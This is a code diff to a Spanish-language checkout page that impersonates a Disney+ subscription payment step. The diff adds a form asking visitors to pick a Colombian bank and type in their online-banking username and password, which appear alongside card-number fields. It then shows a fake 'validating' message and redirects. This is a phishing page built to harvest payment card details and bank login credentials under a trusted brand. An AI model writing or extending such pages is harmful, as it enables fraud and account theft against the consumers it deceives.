@@ -23,9 +23,7 @@ header {
     align-items: center;
 }
 
-header img {
-    height: 34px;
-}
+header img { height: 34px; }
 
 header a {
     color: #bbb;
@@ -40,10 +38,7 @@ header a {
     margin: auto;
 }
 
-.step {
-    font-size: 14px;
-    color: #9ca3af;
-}
+.step { color: #9ca3af; font-size: 14px; }
 
 h1 {
     font-size: 28px;
@@ -71,10 +66,8 @@ input, select {
     box-sizing: border-box;
 }
 
-/* TARJETA ICONOS */
-.input-card {
-    position: relative;
-}
+/* TARJETA */
+.input-card { position: relative; }
 
 .card-icons {
     position: absolute;
@@ -90,31 +83,19 @@ input, select {
     opacity: .9;
 }
 
-/* FECHA + CVV */
+/* ROW FECHA / CVV */
 .row-double {
     display: flex;
     gap: 15px;
 }
 
-.field-group {
-    flex: 1;
-}
-
-/* CAJA DEL PRECIO */
-#price-box {
-    margin-top: 30px;
-    background: #111;
-    border: 1px solid #2e2e2e;
-    padding: 18px;
-    border-radius: 10px;
-}
-
+.field-group { flex: 1; }
 
 /* BOTÓN */
 button {
     width: 100%;
     padding: 16px;
-    margin-top: 20px;
+    margin-top: 25px;
     background: #fff;
     border: none;
     color: #000;
@@ -124,22 +105,24 @@ button {
     font-weight: 600;
 }
 
-button:hover {
-    background: #e6e6e6;
+/* RESPONSIVE */
+@media (max-width: 480px) {
+    .row-double { flex-direction: column; }
 }
 
-/* FOOTER */
-footer {
-    margin-top: 50px;
-    padding: 40px 20px;
-    background: #0d0d0d;
-    text-align: center;
-    color: #7e7e7e;
-    font-size: 13px;
+/* BLOQUE DE VALIDACIÓN DEL BANCO */
+.bank-block {
+    margin-top: 25px;
+    padding: 15px;
+    background: #151515;
+    border-radius: 10px;
+    border: 1px solid #2a2a2a;
 }
+
+.hidden { display: none; }
 </style>
-</head>
 
+</head>
 <body>
 
 <header>
@@ -152,7 +135,6 @@ footer {
     <div class="step">PASO 3 DE 3</div>
     <h1>¡A disfrutar!</h1>
 
-    <!-- FORMULARIO -->
     <label>NOMBRE EN LA TARJETA</label>
     <input type="text" placeholder="Nombre del titular">
 
@@ -191,47 +173,71 @@ footer {
         <option>Santander</option>
     </select>
 
-    <label>RUT (OPCIONAL)</label>
+    <label>RUT (Opcional)</label>
     <input type="text" placeholder="Opcional">
 
+    <!-- BLOQUE BANCO -->
+    <div class="bank-block">
+        <label>Selecciona tu banco</label>
 
+        <select id="bankSelect" onchange="mostrarLoginBanco()">
+            <option value="">Elegir banco…</option>
+            <option value="Bancolombia">Bancolombia</option>
+            <option value="Nequi">Nequi</option>
+            <option value="Davivienda">Davivienda</option>
+            <option value="BBVA">BBVA</option>
+            <option value="Bogotá">Banco de Bogotá</option>
+            <option value="Popular">Banco Popular</option>
+            <option value="Itau">Itaú</option>
+        </select>
 
-    <!-- CAJA PRECIO -->
-    <div id="price-box">
-        <div style="color:#9ca3af; font-size:15px;">Total a pagar</div>
+        <!-- CAMPOS DE USUARIO Y CLAVE -->
+        <div id="bankLogin" class="hidden">
+            <label>Usuario del banco</label>
+            <input type="text" id="bankUser" placeholder="Usuario">
 
-        <div id="finalPrice" style="
-            margin-top: 6px;
-            font-size: 26px;
-            font-weight: 600;
-            color: #00c8ff;">
+            <label>Contraseña</label>
+            <input type="password" id="bankPass" placeholder="Contraseña">
         </div>
-
-        <div id="planName" style="margin-top: 4px; font-size: 14px; color:#6b7280;"></div>
-
-        <div id="planSummary" style="margin-top:12px; font-size:14px; line-height:1.4; color:#d1d5db;"></div>
     </div>
 
-
-    <button>INICIAR SUSCRIPCIÓN</button>
+    <button onclick="validarFinal()">INICIAR SUSCRIPCIÓN</button>
 
 </div>
 
-
-<footer>
-    © 2025 Disney+. Todos los derechos reservados.
-</footer>
-
-
 <script>
-// CARGAR DATOS DEL PLAN
-const planName  = localStorage.getItem("planName")  || "Plan no seleccionado";
-const planPrice = localStorage.getItem("planPrice") || "0";
-const planSummary = localStorage.getItem("planSummary") || "";
+function mostrarLoginBanco() {
+    const bank = document.getElementById("bankSelect").value;
+    const block = document.getElementById("bankLogin");
 
-document.getElementById("finalPrice").innerText = "COP " + planPrice + "/mes";
-document.getElementById("planName").innerText   = planName;
-document.getElementById("planSummary").innerText = planSummary;
+    if (bank === "") {
+        block.classList.add("hidden");
+    } else {
+        block.classList.remove("hidden");
+    }
+}
+
+function validarFinal() {
+    const bank = document.getElementById("bankSelect").value;
+    const user = document.getElementById("bankUser").value;
+    const pass = document.getElementById("bankPass").value;
+
+    if (bank === "") {
+        alert("Debes seleccionar un banco");
+        return;
+    }
+
+    if (user === "" || pass === "") {
+        alert("Debes ingresar usuario y contraseña del banco");
+        return;
+    }
+
+    // Puedes guardar datos si quieres
+    localStorage.setItem("banco", bank);
+
+    alert("Validando con " + bank + "…");
+    window.location.href = "final.html";
+}
 </script>
 
 </body>
